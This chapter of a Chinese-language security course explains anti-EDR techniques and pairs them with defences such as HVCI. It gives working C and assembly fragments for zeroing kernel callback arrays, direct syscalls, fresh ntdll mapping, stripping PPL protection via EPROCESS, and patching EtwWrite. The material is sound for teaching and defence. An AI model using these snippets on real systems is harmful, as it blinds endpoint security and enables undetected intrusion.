# Ch 39 — Anti-EDR 技術

> 目標：從攻擊者視角理解 EDR 感測器的盲點和繞過技術，包含回調移除、Hook 繞過、PPL bypass，以及 EDR 對應的加固手段。

## 前置：攻擊者的能力前提

本章假設攻擊者已有：
- 核心 Ring 0 代碼執行（透過 BYOVD 或核心 exploit）
- 目標：讓 EDR 的感測器失效，隱蔽執行惡意行為

## 技術 1：移除核心回調

EDR 的 `PsSetCreateProcessNotifyRoutineEx`、`PsSetLoadImageNotifyRoutine` 等回調，Windows 把它們存在固定的核心陣列中。

### 找回調陣列

```c
// PspCreateProcessNotifyRoutine 是 ntoskrnl 的內部陣列
// 通過逆向 PsSetCreateProcessNotifyRoutineEx 找到它的地址

// 方法：從 PsSetCreateProcessNotifyRoutineEx 的代碼中找 MOV 指令的偏移
ULONG64 FindPspCreateProcessNotifyRoutine(void)
{
    UNICODE_STRING funcName;
    RtlInitUnicodeString(&funcName, L"PsSetCreateProcessNotifyRoutineEx");
    
    PUCHAR funcAddr = (PUCHAR)MmGetSystemRoutineAddress(&funcName);
    if (!funcAddr) return 0;
    
    // 掃描前 256 位元組，找 lea rcx, [rip + offset] 模式（0x48 0x8D 0x0D）
    for (int i = 0; i < 256; i++) {
        if (funcAddr[i]   == 0x48 &&
            funcAddr[i+1] == 0x8D &&
            funcAddr[i+2] == 0x0D) {
            // RIP-relative offset
            INT32 relOffset = *(INT32*)(funcAddr + i + 3);
            return (ULONG64)(funcAddr + i + 7 + relOffset);
        }
    }
    return 0;
}
```

### 清空回調

```c
// PspCreateProcessNotifyRoutine 是 EX_CALLBACK 陣列（64 個元素）
// 每個元素是一個指針，指向回調結構（低位有 flag bits）

ULONG64 arrayAddr = FindPspCreateProcessNotifyRoutine();
if (!arrayAddr) return;

// 遍歷所有 64 個槽，清空 EDR 的回調
for (int i = 0; i < 64; i++) {
    ULONG64* slot = (ULONG64*)(arrayAddr + i * sizeof(ULONG64));
    
    // 讀取並解碼（低位 flag 清除後才是指針）
    ULONG64 val = *slot & ~0xFULL;
    if (!val) continue;
    
    // 可以選擇性清除特定回調（根據模組判斷）
    // 或清除全部：
    *slot = 0;
    
    DbgPrint("[AAEDR] Cleared callback slot %d\n", i);
}
```

### 對應防禦：回調自驗

EDR 可以定期掃描回調陣列，確認自己的回調還在。但攻擊者知道這點，可以：
1. 清除回調
2. 執行惡意操作
3. 立刻重新插回來

EDR 的反制：用 ETW `Microsoft-Windows-Kernel-Audit-API-Calls` 記錄 `PsSetCreateProcessNotifyRoutineEx` 呼叫——但這個 ETW 本身也可以被 patch。

## 技術 2：Userland Hook 繞過

大多數 EDR 把 DLL 注入目標進程，在 `ntdll!NtCreateUserProcess` 等函式前插入 Inline Hook（JMP 到 EDR 的分析代碼）。

### 用戶態 Hook 繞過方式

**方式 A：系統呼叫直接發射（Direct Syscall）**

不透過 ntdll，直接在攻擊者代碼裡寫 `syscall` 指令：

```asm
; 攻擊者的 Shellcode / 工具
; 直接呼叫 NtCreateUserProcess（syscall number 0xC8 for Win 10 21H2）
mov r10, rcx
mov eax, 0xC8      ; NtCreateUserProcess syscall number（版本相依）
syscall
ret
```

因為繞過了 ntdll，EDR 在 ntdll 的 Hook 完全看不到。

**問題**：syscall number 每個 Windows 版本不同，需要動態解析。

```c
// 動態解析 syscall number（從 ntdll 讀，在 Hook 之前）
ULONG GetSyscallNumber(const char* funcName)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PUCHAR funcAddr = (PUCHAR)GetProcAddress(ntdll, funcName);
    
    // ntdll 函式頭：
    // mov r10, rcx      (4C 8B D1)
    // mov eax, <SSN>    (B8 xx xx xx xx)
    // test byte ptr [...]
    // jne ...
    // syscall
    
    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 &&
        funcAddr[3] == 0xB8) {
        return *(ULONG*)(funcAddr + 4);
    }
    return 0;  // 被 hook 了（開頭是 JMP）
}
```

**方式 B：乾淨 ntdll 映射（Fresh DLL Mapping）**

```c
// 從磁碟重新映射 ntdll.dll（EDR 只 Hook 記憶體中的版本，不會 patch 磁碟）
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                            GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);

HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
PVOID pNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// 從 pNtdll 取到未被 hook 的函式地址
PVOID pNtCreateProcess = GetFunctionFromDLL(pNtdll, "NtCreateUserProcess");
// 呼叫 pNtCreateProcess → 繞過 EDR Hook
```

**方式 C：Unhooking（移除 ntdll Hook）**

把 ntdll 函式的頭部從 `JMP <EDR_code>` 還原成原始的 `MOV r10, rcx; MOV eax, <SSN>`。

## 技術 3：PPL Bypass

EDR 服務以 PPL 啟動保護。但 PPL 的保護可以在核心層被繞過：

### 用 Handle 降權攻擊

PPL 進程不能被普通進程 `TerminateProcess`，但：
- 如果攻擊者有核心任意寫，可以直接修改 PPL 進程的 `EPROCESS.Protection` 欄位
- 把 `PS_PROTECTION.Type` = 0（PsProtectedTypeNone）→ 進程不再受 PPL 保護

```c
// EPROCESS.Protection 的偏移（版本相依，約 0x87A–0x880）
#define EPROCESS_PROTECTION_OFFSET 0x87A

// 找 EDR 進程的 EPROCESS
PEPROCESS edrProcess;
PsLookupProcessByProcessId(edrPid, &edrProcess);

// 清除 PPL Protection
PUCHAR protectionAddr = (PUCHAR)edrProcess + EPROCESS_PROTECTION_OFFSET;
*protectionAddr = 0;  // PS_PROTECTION = 0 = 無保護

ObDereferenceObject(edrProcess);

// 現在可以 TerminateProcess(edrHandle) 了
```

### ObCallback Bypass

如果 EDR 用 `ObRegisterCallbacks` 降低 Handle 的 Access Mask，攻擊者在核心層可以直接操作 EPROCESS 而不需要 Handle：

```c
// 不用 TerminateProcess，直接核心層終止
PsTerminateProcess(edrProcess, 0);  // 核心 API，不走 Handle 路徑
```

## 技術 4：ETW Patching（複習）

```c
// 把 EtwWrite 的第一個 byte 改成 0xC3（RET）
// 所有核心 ETW 事件靜默
PVOID etwWrite = MmGetSystemRoutineAddress(&(UNICODE_STRING)RTL_CONSTANT_STRING(L"EtwWrite"));

KIRQL oldIrql = WPoff();  // 關閉 WP bit（Write Protect）
*(PUCHAR)etwWrite = 0xC3;
WPon(oldIrql);

// WPoff/WPon：操作 CR0.WP bit 讓核心代碼頁面可寫
// 但 HVCI 下即使關 WP bit 也不能寫核心代碼（Hypervisor 強制唯讀）
```

## 技術 5：Minifilter 解除

EDR 的 Minifilter 靠 FltMgr 的 Altitude 排序執行。攻擊者可以直接取消 FltMgr 的 Callback 注冊：

```c
// 找 FltMgr 內的 Filter 清單，找到 EDR 的 Filter 並移除
// 或直接呼叫 FltUnregisterFilter（但需要找到 EDR 的 PFLT_FILTER 指針）

// 更暴力：修改 FltMgr 的 Dispatch 表
// （但這觸碰了核心結構，可能 PatchGuard 覆蓋後 BSOD）
```

## 攻防對抗總結

| 攻擊技術 | EDR 的對應 | 誰贏？ |
|---------|-----------|-------|
| 移除核心回調 | 回調自驗 + ETW | 攻擊者（有 Ring 0）|
| Direct Syscall | ETW Kernel-Audit-API + 核心回調（不依賴 ntdll）| 核心回調仍有效 |
| Fresh ntdll / Unhooking | 核心層 Callback（不走 ntdll）| 核心回調仍有效 |
| PPL Bypass（核心任意寫）| HVCI 保護 EPROCESS | HVCI 贏 |
| ETW Patch | HVCI 保護核心代碼 | HVCI 贏 |

**結論**：沒有 HVCI 的系統，有 Ring 0 的攻擊者能有效盲化 EDR。HVCI（Ch 40）是真正的防線。

## 自我檢核

- [ ] 核心回調移除：掃描 `PspCreateProcessNotifyRoutine` 陣列，找 EDR 函式指針並清零
- [ ] Direct Syscall：在攻擊者代碼中直接發 `syscall`，繞過 ntdll 的 EDR Hook
- [ ] Fresh ntdll：從磁碟重新映射未被 Hook 的 ntdll，繞過記憶體中的 Hook
- [ ] PPL Bypass：核心任意寫修改 `EPROCESS.Protection` = 0 → 進程失去 PPL 保護
- [ ] HVCI 是對抗 Anti-EDR 技術的最後防線：Ring 0 無法修改核心代碼或受保護結構

→ [Ch 40 VBS、HVCI 與安全啟動](./40-vbs-hvci-secureboot.md)
